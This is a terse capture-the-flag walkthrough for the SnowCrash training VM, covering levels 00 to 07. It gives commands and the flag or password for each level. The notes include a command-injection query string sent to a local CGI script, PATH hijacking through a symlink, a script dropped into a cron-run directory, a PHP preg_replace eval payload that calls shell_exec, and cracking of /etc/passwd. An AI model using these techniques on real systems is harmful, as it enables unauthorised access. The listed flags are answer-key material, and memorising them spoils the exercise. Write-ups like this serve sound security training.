
Image: `/sgoinfre/goinfre/ISO/SnowCrash.iso`  

## Level00

`ssh -l level00 -p <port> 127.0.0.1`  
```
find / -user flag00 2>/dev/null
strings /usr/sbin/john
```
-> multi decoder  

`ssh -l flag00 -p <port> 127.0.0.1`
```
getflag
```

> `level00`
> `nottoohardhere`

## Level01

```
$> scp -P <port> level01@127.0.0.1:/etc/passwd /tmp/level01.txt
$> docker run --rm --name level01 -it debian:latest
#> apt-get update && apt-get -y install john
$> docker cp /tmp/level01.txt level01:/root/
#> john --show /root/level01.txt
```

> `x24ti5gi3x0ol2eh4esiuxias`
> `abcdefg`

## Level02

```
scp -P <port> level02@127.0.0.1:~/level02.pcap /tmp
chmod u+r /tmp/level02.pcap
```
-> wireshark -> follow TCP stream  
```
man ascii
```

> `f2av5il02puano7naaf6adaaf`
> `ft_waNDReL0L`

## Level03

```
strings ~/level03
PATH=/tmp:$PATH
ln -s /bin/getflag /tmp/echo
~/level03
```

> `kooda2puivaav1idi4f57q8iq`

## Level04

```
cat ~/level04.pl
curl --get --data-urlencode 'x=a;getflag' localhost:4747
```

> `qi0maab88jeaj46qoumi7maus`

## Level05

```
cat /var/mail/level05
cat <<_EOF > /opt/openarenaserver/level05.sh
#!/bin/sh
getflag >/tmp/flag.txt 2>&1
_EOF
watch -n 1 cat /tmp/flag.txt
```
> `ne2searoevaevoem4ov4ar8ap`

## Level06

```
php --version
```
[PHP - Documentation for PHP 5](https://www.php.net/manual/php5.php)  
[PHP 5 - PCRE Patterns - Pattern Modifiers - eval](https://php-legacy-docs.zend.com/manual/php5/en/reference.pcre.pattern.modifiers#reference.pcre.pattern.modifiers.eval)  
[PHP 5 - Process Control Extensions - System program execution](https://php-legacy-docs.zend.com/manual/php5/en/book.exec)  
```
cat <<_EOF >/tmp/level06.txt
[x {\${shell_exec(\$z)}}]
_EOF
~/level06 /tmp/level06.txt getflag
```

> `viuaaale9huek52boumoomioc`

## Level07

> `wiok45aaoguiboiki2tuin6ub`


